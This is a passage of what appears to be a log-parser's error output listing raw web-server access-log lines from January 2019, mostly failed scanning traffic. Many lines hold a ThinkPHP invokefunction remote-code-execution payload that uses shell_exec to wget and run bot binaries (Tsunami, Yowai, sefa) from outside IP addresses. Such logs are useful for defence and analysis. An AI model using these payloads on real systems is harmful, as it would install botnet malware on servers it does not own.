,%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27in%27,%20field:%27persistedObjectId%27,%20val:[1132261,%201141394,%201152740,%201157399,%201162757,%201162784,%201163433,%201163458,%201163491,%201164137,%201164170,%201164204,%201170585,%201180757,%201186324,%201192491,%201202677,%201206088,%201211683,%201216347,%201221815,%201226823,%201232111,%201236848,%201242299,%201248494,%201255362,%201269844,%201273095,%201273594,%201274911,%201277429,%201281160,%201287133,%201288507,%201292448,%201293149,%201299401,%201305868,%201314183,%201318413,%201321856,%201325306,%201336507,%201336569,%201340015,%201340124,%201355331,%201355503,%201358951,%201359376,%201360159,%201360331,%201373561,%201373691,%201373817,%201374201,%201374449,%201380272,%201381864,%201389293,%201391526,%201401342,%201408709,%201423222,%201424109,%201424676,%201425244,%201425736,%201426169,%201427981,%201428236,%201428896,%201429330,%201431149,%201431284,%201438343,%201452686,%201453110,%201457728,%201457895,%201458328,%201478609,%201509796,%201512143,%201515917,%201531810,%201541818,%201550826,%201551263,%201552038,%201552587,%201552739,%201566551,%201567457,%201578138,%201592324,%201610621,%201612148,%201615507,%201619961,%201633984,%201653517,%201658611,%201663093,%201680244,%201680543,%201682265,%201688401,%201707645,%201713624,%201763702,%201780392,%201786397,%201793270,%201799553,%201812188,%201816983,%201831091,%201835974,%201842523,%201848262,%201851552,%201851798,%201856474,%201856808,%201863025,%201863122,%201863336,%201864696,%201867681,%201870627,%201870822,%201871155,%201871156,%201872607,%201872680,%201872795,%201872869,%201872942,%201874056,%201874129,%201874202,%201874275,%201874349,%201874422,%201874495,%201874569,%201874642,%201874716,%201874790,%201874863,%201874936,%201875010,%201875083,%201875157,%201875230,%201875304,%201875377,%201875451,%201875525,%201875599,%201875672,%201875748,%201875821,%201875895,%201880033,%201880129,%201881117,%201882126,%201882683,%201882722,%201883435,%201886044,%201892636,%201892756,%201893850,%201893890,%201894641,%201895043,%201896810,%201896952,%201897555,%201900039,%201903599,%201903797,%201904548,%201904699,%201905114,%201905289,%201905958,%201906256,%201906687,%201907485,%201907735,%201907768,%201907801,%201907840,%201910752,%201917185,%201920194,%201920818,%201931132,%201939261,%201942350,%201942436,%201949430,%201949860,%201950288,%201954610,%201958097,%201958273,%201964583,%201966833,%201972840,%201977314,%201132262,%201141395,%201152741,%201157400,%201162759,%201162785,%201163436,%201163459,%201163492,%201164138,%201164171,%201164205,%201170586,%201180758,%201186325,%201202678,%201206089,%201211684,%201211921,%201213138,%201216348,%201216924,%201216980,%201217047,%201217092,%201219005,%201219186,%201219197,%201219252,%201219365,%201219942,%201221816,%201226824,%201232112,%201236849,%201242300,%201248495,%201255363,%201269845,%201273096,%201273595,%201274912,%201277430,%201281161,%201287134,%201288508,%201292449,%201293150,%201299402,%201305869,%201314184,%201318414,%201325307,%201336508,%201336570,%201340016,%201340125,%201355332,%201355504,%201358952,%201359377,%201360161,%201360333,%201373563,%201373693,%201373819,%201374203,%201374451,%201380274,%201381866,%201389295,%201391528,%201401344,%201408711,%201423224,%201424111,%201424678,%201425246,%201425738,%201426171,%201427983,%201428238,%201428898,%201429332,%201452688,%201453112,%201457730,%201457897,%201458330,%201478611,%201509798,%201512145,%201515919,%201531812,%201541820,%201550828,%201551265,%201552040,%201552591,%201552745,%201566553,%201578140,%201592326,%201610623,%201612150,%201615509,%201619963,%201634010,%201653519,%201658613,%201663095,%201680246,%201680545,%201682267,%201688405,%201707649,%201713626,%201763704,%201780394,%201786401,%201793272,%201799555,%201812190,%201816985,%201831093,%201835976,%201842525,%201848264,%201863027,%201863124,%201863338,%201864698,%201867683,%201870629,%201870824,%201871157,%201871158,%201872609,%201872682,%201872797,%201872871,%201872944,%201874058,%201874131,%201874204,%201874277,%201874351,%201874424,%201874497,%201874571,%201874644,%201874718,%201874792,%201874865,%201874938,%201875012,%201875085,%201875159,%201875232,%201875306,%201875379,%201875453,%201875527,%201875601,%201875674,%201875750,%201875823,%201875897,%201880035,%201880131,%201881119,%201882128,%201882685,%201882724,%201883437,%201886046,%201892640,%201892760,%201893854,%201893892,%201894643,%201895045,%201896812,%201896954,%201903601,%201903799,%201904550,%201904701,%201905116,%201905291,%201905960,%201906258,%201906689,%201907487,%201907737,%201907803,%201907842,%201910754,%201917187,%201920196,%201920820,%201922679,%201922836,%201922837,%201923017,%201928721,%201931134,%201933483,%201934330,%201935090,%201935211,%201940737,%201940855,%201942354,%201942438,%201949432,%201949862,%201950290,%201954612,%201958099,%201958275,%201964585,%201966835,%201972842,%201977316,%201978694,%201978772]}]}]},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:or,data:[{op:%27neProperty%27,%20field:%27oldValue%27,%20val:%27newValue%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:and,data:[{op:%27isNull%27,%20field:%27oldValue%27},%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20%20{op:%27isNotNull%27,%20field:%27newValue%27}]}]}]}]&columns=[{%27name%27:%27actor%27},{%27name%27:%27className%27},{%27name%27:%27persistedObjectId%27},{%27name%27:%27eventName%27},{%27name%27:%27propertyName%27},{%27name%27:%27oldVa" 414 186 "-" "-" "-"\n', 'list index out of range')
('102.165.52.19 - - [24/Jan/2019:13:25:44 +0330] "\\x16\\x03\\x01\\x00^\\x01\\x00\\x00Z\\x03\\x01\\x5CH\\x9D\\xB6>\\xA93\\x9C \\x9F\\x80\\xDF\\xD1\\xB9\\xF1\\x7F\\xDC\\xEC\\xF0\\xFD\\xD2C\\x90\\xCE\\x1E\\x93\\x02J\\xD0o\\xBAI\\x00\\x00\\x18\\xC0\\x14\\xC0\\x13\\x005\\x00/\\xC0" 400 166 "-" "-" "-"\n', 'list index out of range')
('102.165.52.19 - - [24/Jan/2019:13:25:44 +0330] "\\x16\\x03\\x01\\x00^\\x01\\x00\\x00Z\\x03\\x01\\x5CH\\x9D\\xB6\\xA6\\xCDg\\x80\\xC8[=\\xE6\\xCA\\xD8\\x16\\xAE\\xA4P\\xA3j\\xB5\\xDC\\xE9Pl\\xBD\\xB6+\\x96n\\x8Du\\x00\\x00\\x18\\xC0\\x14\\xC0\\x13\\x005\\x00/\\xC0" 400 166 "-" "-" "-"\n', 'list index out of range')
('3.83.247.150 - - [24/Jan/2019:13:50:35 +0330] "GET /?utm_source=2&utm_medium=21&utm_campaign=Z&utm_term=202&utm_content=2003" 200 65536 "-" "-" "-"\n', 'list index out of range')
('188.210.165.90 - - [24/Jan/2019:14:06:56 +0330] "G" 400 0 "-" "-" "-"\n', 'list index out of range')
('89.35.146.67 - - [24/Jan/2019:15:04:01 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('68.70.213.56 - - [24/Jan/2019:15:10:14 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('186.147.251.21 - - [24/Jan/2019:15:30:29 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('92.87.16.123 - - [24/Jan/2019:15:32:57 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('42.118.71.126 - - [24/Jan/2019:15:56:37 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=\'wget http://185.244.25.139/bins/Tsunami.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('202.70.250.38 - - [24/Jan/2019:15:58:56 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1\\x00" 400 166 "-" "-" "-"\n', 'list index out of range')
('208.85.211.218 - - [24/Jan/2019:16:06:52 +0330] "x" 400 166 "-" "-" "-"\n', 'list index out of range')
('123.120.173.71 - - [24/Jan/2019:16:14:41 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('189.59.96.224 - - [24/Jan/2019:16:17:59 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('82.47.156.228 - - [24/Jan/2019:19:02:19 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('85.105.7.73 - - [24/Jan/2019:19:57:23 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('42.117.152.36 - - [24/Jan/2019:21:22:52 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('158.69.237.205 - - [24/Jan/2019:21:55:08 +0330] "" 400 0 "-" "-" "-"\n', 'list index out of range')
('158.69.237.205 - - [24/Jan/2019:21:55:23 +0330] "" 400 0 "-" "-" "-"\n', 'list index out of range')
('194.113.106.125 - - [24/Jan/2019:22:23:43 +0330] "" 400 0 "-" "-" "-"\n', 'list index out of range')
('121.84.86.234 - - [24/Jan/2019:22:41:12 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('58.135.224.45 - - [24/Jan/2019:22:53:06 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('103.2.64.231 - - [24/Jan/2019:23:58:01 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('113.22.59.250 - - [25/Jan/2019:00:54:03 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('46.243.179.232 - - [25/Jan/2019:01:00:35 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('112.28.77.213 - - [25/Jan/2019:01:36:46 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=\'wget http://178.128.245.144/bins/Tsunami.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('118.68.205.254 - - [25/Jan/2019:01:54:18 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('36.106.21.29 - - [25/Jan/2019:02:21:00 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.241/bins/sefa.x86 -O /tmp/.sefa; chmod 777 /tmp/.sefa; /tmp/.sefa sefa.x86\' HTTP/1.1" 400 166 "-" "sefa/2.0" "-"\n', 'list index out of range')
('220.246.209.65 - - [25/Jan/2019:03:10:06 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('112.234.7.215 - - [25/Jan/2019:03:13:49 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=\'wget http://207.154.193.227/bins/Tsunami.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('117.198.103.116 - - [25/Jan/2019:03:19:07 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('42.118.10.161 - - [25/Jan/2019:03:20:19 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('61.86.79.193 - - [25/Jan/2019:03:37:44 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('149.202.169.246 - - [25/Jan/2019:05:47:45 +0330] "\\x15\\x03\\x01\\x00\\x02\\x02P" 400 166 "-" "-" "-"\n', 'list index out of range')
('149.202.169.246 - - [25/Jan/2019:05:47:46 +0330] "\\x15\\x03\\x01\\x00\\x02\\x02P" 400 166 "-" "-" "-"\n', 'list index out of range')
('124.140.76.80 - - [25/Jan/2019:06:13:06 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('222.138.138.64 - - [25/Jan/2019:06:29:58 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('72.52.87.60 - - [25/Jan/2019:07:14:40 +0330] "\\x03\\x01\\x02\\x00\\x01\\x00\\x01\\xFC\\x03\\x03 \\x84\\xDD9\\xF2\\xBA\\x911\\xEAL\\xC1c\\xC8\\xB15\\xAB\\xC7\\x8F\\x19/0\\xB9\\x05\\xA3~\\x93\\xF3!\\xEC\\x12\\xEAv \\x9F\\xE2\\xAE\\xE7\\xDF\\x83\\x12\'\\xF1\\xE5\\x10\\xBD\\xA1\\xECg\\x1D\\xDC\\xBF\\xA0)\\xC8\\xAA\\xE0\\xB1-\\xFE\\x12\\xCBO\\x03\\xCA-\\x00*\\xCC\\x14\\xCC\\x13\\xCC\\x15\\xC0/\\xC0+\\x00\\x9E\\xC0\\x14\\xC0" 400 166 "-" "-" "-"\n', 'list index out of range')
('72.52.87.60 - - [25/Jan/2019:07:16:55 +0330] "\\x03\\x01\\x02\\x00\\x01\\x00\\x01\\xFC\\x03\\x03\\x94\\x12\\xAD?%\\xB8\\x15!\\x9B\\xB7\\xED*4SV\\x18\\xE1\\xEF\\xF3+\\x9E\\xE0\\xF8\\x13\\x14\\xA6e" 400 166 "-" "-" "-"\n', 'list index out of range')
('43.230.197.4 - - [25/Jan/2019:07:46:03 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('126.58.237.63 - - [25/Jan/2019:08:04:00 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('116.90.206.18 - - [25/Jan/2019:08:54:09 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('103.2.64.231 - - [25/Jan/2019:08:59:44 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('5.188.210.12 - - [25/Jan/2019:09:10:31 +0330] "\\x05\\x01\\x00" 400 166 "-" "-" "-"\n', 'list index out of range')
('5.188.210.12 - - [25/Jan/2019:09:12:12 +0330] "\\x04\\x01\\x00P\\x05\\xBC\\xD2\\x0C\\x00" 400 166 "-" "-" "-"\n', 'list index out of range')
('89.215.238.65 - - [25/Jan/2019:09:35:47 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=\'wget http://207.154.193.227/bins/Tsunami.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('112.137.114.117 - - [25/Jan/2019:09:42:07 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('202.214.186.65 - - [25/Jan/2019:10:32:08 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('144.132.10.218 - - [25/Jan/2019:11:27:44 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('82.47.156.228 - - [25/Jan/2019:12:27:26 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('82.47.156.228 - - [25/Jan/2019:12:27:26 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('185.53.88.19 - - [25/Jan/2019:13:48:00 +0330] "\\x16\\x03\\x01\\x00b\\x01\\x00\\x00^\\x03\\x01\\x5CJ\\xE3*\\x84Gv\\xBD\\xFA\\xA8}\\xA3\\xB8\\xB0\\xA8\\xDD\\x080\\x16\\xBD(O\\xB81r\\xDDU\\xA85" 400 166 "-" "-" "-"\n', 'list index out of range')
('185.53.88.19 - - [25/Jan/2019:13:48:00 +0330] "\\x16\\x03\\x01\\x00b\\x01\\x00\\x00^\\x03\\x01\\x5CJ\\xE3*H\\x80o\\x90\\xBE\\xB5\\xF2\\xB8j\\xF6\\xFEV\\xE2A\\xDB\\xCD\\x19\\xBE\\xB73\\xDA\\x81\\xFC\\xA7+,\\xAD\\xC5\\x00\\x00\\x18\\xC0\\x14\\xC0\\x13\\x005\\x00/\\xC0" 400 166 "-" "-" "-"\n', 'list index out of range')
('1.215.205.157 - - [25/Jan/2019:13:52:51 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.114/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('42.119.194.186 - - [25/Jan/2019:13:54:08 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('126.58.237.63 - - [25/Jan/2019:14:04:33 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('43.230.197.4 - - [25/Jan/2019:14:53:22 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('162.244.81.232 - - [25/Jan/2019:15:08:10 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86\' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"\n', 'list index out of range')
('42.117.207.158 - - [25/Jan/2019:15:08:58 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=\'wget http://185.244.25.139/bins/Tsunami.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('91.148.174.153 - - [25/Jan/2019:15:56:04 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.139/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami ThinkPHP\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('176.175.104.231 - - [25/Jan/2019:16:03:37 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.221/bins/Yowai.x86 -O /tmp/Yowai; chmod 777 /tmp/Yowai; /tmp/Yowai Yowai.x86\' HTTP/1.1" 400 166 "-" "Yowai/2.0" "-"\n', 'list index out of range')
('64.68.245.69 - - [25/Jan/2019:16:35:26 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.255.25.168/OwO/Tsunami.x86 -O /tmp/.Tsunami; chmod 777 /tmp/.Tsunami; /tmp/.Tsunami Tsunami.x86\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('185.244.25.243 - - [25/Jan/2019:17:27:25 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]=\'wget http://207.154.193.227/bins/Tsunami.x86 -O thonkphp ; chmod 777 thonkphp ; ./thonkphp ThinkPHP ; rm -rf thinkphp\' HTTP/1.1" 400 166 "-" "Tsunami/2.0" "-"\n', 'list index out of range')
('162.244.81.232 - - [25/Jan/2019:18:33:19 +0330] "GET /index.php?s=/index/\\x09hink\\x07pp/invokefunction&function=call_user_func_array&vars[0]=shell_exec&vars[1][]= \'wget http://185.244.25.241/x86 -O /tmp/kh; chmod 777 /tmp/kh; /tmp/kh x86\' HTTP/1.1" 400 166 "-" "Cayosin/2.0" "-"\n', 'list index out of range')
